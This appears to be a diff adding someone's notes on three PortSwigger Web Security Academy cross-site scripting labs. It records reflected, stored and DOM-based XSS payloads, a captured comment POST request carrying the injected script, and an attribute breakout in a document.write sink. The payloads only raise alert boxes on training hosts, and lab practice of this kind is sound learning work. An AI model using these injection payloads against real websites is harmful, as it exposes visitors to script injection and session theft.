@@ -1,0 +1,54 @@
+1) Lab: Reflected XSS into HTML context with nothing encoded
+
+<script>alert('test!')</script>
+
+->
+
+https://0aba00d704b3e7a08346014700e900b9.web-security-academy.net/?search=%3Cscript%3Ealert%28%27test%21%27%29%3C%2Fscript%3E
+
+2) Lab: Stored XSS into HTML context with nothing encoded
+
+Post comment
+
+->
+
+<script>alert('test!')</script>
+
+---
+
+POST /post/comment HTTP/2
+Host: 0a0f00e9048f26e1827e153b0024002d.web-security-academy.net
+Cookie: session=nlLvdAdAA3UHfR9qzPNsx7lCzvkeJgpM
+Content-Length: 225
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a0f00e9048f26e1827e153b0024002d.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a0f00e9048f26e1827e153b0024002d.web-security-academy.net/post?postId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=ZXzmFhhnsbNYF2N3rGdYdjWr5Qj9gugO&postId=1&comment=%3Cscript%3Ealert%28%27test%21%27%29%3C%2Fscript%3E&name=hacker&email=hacker%40hacker.com&website=http%3A%2F%2Fexploit-0ada00a7040992778003da1001c7003e.exploit-server.net
+
+3) Lab: DOM XSS in document.write sink using source location.search
+
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+
+->
+
+"><svg onload=alert(test)>
+
+->
+
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+"><svg onload=alert(test)>+'">');
+
